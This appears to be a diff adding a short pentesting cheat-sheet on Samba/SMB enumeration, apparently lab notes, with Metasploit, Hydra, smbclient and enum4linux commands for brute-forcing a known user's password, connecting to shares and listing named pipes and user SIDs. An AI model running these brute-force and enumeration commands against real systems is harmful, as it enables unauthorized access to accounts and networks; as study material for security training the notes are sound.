@@ -1,0 +1,51 @@
+#### SAMBA ENUMERATION - PART 3
+
+##### bruteforce user's password ; while username is known (Metasploit)
+
+> - msfconsole
+> - use auxiliary/scanner/smb/smb_login
+> - set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+> - set SMBUser jane
+> - set RHOSTS 192.212.251.3
+> - exploit
+
+---
+
+##### bruteforce user's password ; while username is known (Hydra)
+
+> hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 smb
+
+- l -> username
+- P -> password's file
+- SMB -> protocol
+
+---
+
+##### Connect to a share using username/password found
+
+> smbclient //192.212.251.3/jane -U jane
+
+Prompt asking for password : 
+
+---
+
+##### List the named pipes available over SMB on the samba server
+
+Metasploit Module : pipe_auditor
+
+> - msfconsole
+> - use auxiliary/scanner/smb/pipe_auditor
+> - set SMBUser admin
+> - set SMBPass password1
+> - set RHOSTS 192.212.251.3
+> - exploit
+
+---
+
+##### List sid of Users using Enum4linux
+
+> enum4linux -r -u "admin" -p "password1" 192.212.251.3
+
+- r -> show SID of all users
+- u -> username
+- p -> password
